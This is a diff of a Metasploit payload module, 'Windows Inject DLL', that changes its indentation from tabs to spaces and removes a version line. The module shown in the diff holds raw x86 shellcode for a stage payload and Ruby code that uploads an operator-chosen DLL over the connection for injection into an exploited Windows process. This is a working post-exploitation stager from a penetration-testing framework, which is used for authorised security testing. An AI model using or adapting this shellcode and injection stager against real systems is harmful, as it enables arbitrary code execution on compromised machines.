@@ -11,32 +11,31 @@ module Msf
 ###
 module Payload::Windows::DllInject
 
-	include Msf::Payload::Windows
+  include Msf::Payload::Windows
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'          => 'Windows Inject DLL',
-			'Version'       => '$Revision$',
-			'Description'   => 'Inject a custom DLL into the exploited process',
-			'Author'        =>
-				[
-					'jt <jt@klake.org>',
-					'skape',
-				],
-			'License'       => MSF_LICENSE,
-			'Platform'      => 'win',
-			'Arch'          => ARCH_X86,
-			'PayloadCompat' =>
-				{
-					'Convention' => 'sockedi -http -https'
-				},
-			'Stage'         =>
-				{
-					'Offsets' =>
-						{
-							'EXITFUNC' => [ 193, 'V' ]
-						},
-					'Payload' =>
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'          => 'Windows Inject DLL',
+      'Description'   => 'Inject a custom DLL into the exploited process',
+      'Author'        =>
+        [
+          'jt <jt@klake.org>',
+          'skape',
+        ],
+      'License'       => MSF_LICENSE,
+      'Platform'      => 'win',
+      'Arch'          => ARCH_X86,
+      'PayloadCompat' =>
+        {
+          'Convention' => 'sockedi -http -https'
+        },
+      'Stage'         =>
+        {
+          'Offsets' =>
+            {
+              'EXITFUNC' => [ 193, 'V' ]
+            },
+          'Payload' =>
 
 "\x55\x8b\xec\x81\xec\xa8\x01\x00\x00\x53\x56\x57\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff" +
 "\x5b\x83\xeb\x15\x89\x9d\x60\xff\xff\xff\x89\xbd\x58\xfe\xff\xff\xeb\x70\x56\x33" +
@@ -172,65 +171,65 @@ module Payload::Windows::DllInject
 "\x50\x8b\x45\x08\xff\x90\x6c\x01\x00\x00\x6a\x00\x8b\x45\x08\xff\x90\x64\x01\x00" +
 "\x00\x83\x65\x08\x00\x33\xc0\xc9\xc3"
 
-				}
-			))
+        }
+      ))
 
-		register_options(
-			[
-				OptPath.new('DLL', [ true, "The local path to the DLL to upload" ]),
-			], DllInject)
+    register_options(
+      [
+        OptPath.new('DLL', [ true, "The local path to the DLL to upload" ]),
+      ], DllInject)
 
-		register_advanced_options(
-			[
-				OptString.new('LibraryName', [ false, "The symbolic name of the library to upload", "msf.dll" ])
-			], DllInject)
-	end
+    register_advanced_options(
+      [
+        OptString.new('LibraryName', [ false, "The symbolic name of the library to upload", "msf.dll" ])
+      ], DllInject)
+  end
 
-	#
-	# Returns the library name
-	#
-	def library_name
-		datastore['LibraryName'] || 'msf.dll'
-	end
+  #
+  # Returns the library name
+  #
+  def library_name
+    datastore['LibraryName'] || 'msf.dll'
+  end
 
-	#
-	# Returns the library path
-	#
-	def library_path
-		datastore['DLL']
-	end
+  #
+  # Returns the library path
+  #
+  def library_path
+    datastore['DLL']
+  end
 
-	#
-	# Transmits the DLL injection payload and its associated DLL to the remote
-	# computer so that it can be loaded into memory.
-	#
-	def handle_connection_stage(conn, opts = {})
-		data = library_name + "\x00"
+  #
+  # Transmits the DLL injection payload and its associated DLL to the remote
+  # computer so that it can be loaded into memory.
+  #
+  def handle_connection_stage(conn, opts = {})
+    data = library_name + "\x00"
 
-		begin
-			File.open(library_path, "rb") { |f|
-				data += f.read
-			}
-		rescue
-			print_error("Failed to load DLL: #{$!}.")
+    begin
+      File.open(library_path, "rb") { |f|
+        data += f.read
+      }
+    rescue
+      print_error("Failed to load DLL: #{$!}.")
 
-			# TODO: exception
-			conn.close
-			return
-		end
+      # TODO: exception
+      conn.close
+      return
+    end
 
-		print_status("Uploading DLL (#{data.length} bytes)...")
+    print_status("Uploading DLL (#{data.length} bytes)...")
 
-		# Send the size of the thing we're transferring
-		conn.put([ data.length ].pack('V'))
-		# Send the image name + image
-		conn.put(data)
+    # Send the size of the thing we're transferring
+    conn.put([ data.length ].pack('V'))
+    # Send the image name + image
+    conn.put(data)
 
-		print_status("Upload completed.")
+    print_status("Upload completed.")
 
-		# Call the parent so the session gets created.
-		super
-	end
+    # Call the parent so the session gets created.
+    super
+  end
 
 end
 
